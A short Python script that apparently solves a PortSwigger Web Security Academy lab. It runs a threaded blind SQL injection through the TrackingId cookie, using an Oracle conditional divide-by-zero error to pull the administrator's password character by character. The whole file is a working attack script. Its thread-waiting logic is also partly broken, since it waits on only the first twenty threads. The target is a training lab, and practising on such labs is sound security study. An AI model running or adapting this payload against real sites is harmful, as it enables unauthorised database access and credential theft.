import requests
import threading
import time

host='https://0a1300ab04a348ad83a060bd00300071.web-security-academy.net/'
contrasena={}
lista_daemons=[]
chars='abcdefghijklmnopqrstuvwxyz0123456789'
r=requests.Session()

def peticiones(position,char):
    cookies={
            'TrackingId':"ssko4DXl7TAJtivM'||(select case when substr(password,%d,1)='%s' then to_char(1/0) else '' end from users where username='administrator')||'" % (position,char),
            'session':"KKILDzbajgjzsvm4zBtNOVY7A08xFYFx"
        }
     
    r=requests.get(host,cookies=cookies)
       
    if r.status_code==500:
        contrasena[position]=char

def ordenar_resultado():
    
    contrasena_final=""
    for i in range(1,len(contrasena)+1):
        contrasena_final+=contrasena[i]
    print('La contraseña es: ',contrasena_final)
    r.close()


def comprobacion_daemons():
     
    
    for i in range(0,20):
        while lista_daemons[i].is_alive()==True:
            pass
    ordenar_resultado()


for position in range(1,21):
    print('Posición: ',position)
    for char in chars:
        
        
            thread=threading.Thread(target=peticiones,args=(position,char))
            thread.start()
            lista_daemons.append(thread)
            time.sleep(0.1)
thread_daemos=threading.Thread(target=comprobacion_daemons)
thread_daemos.start()


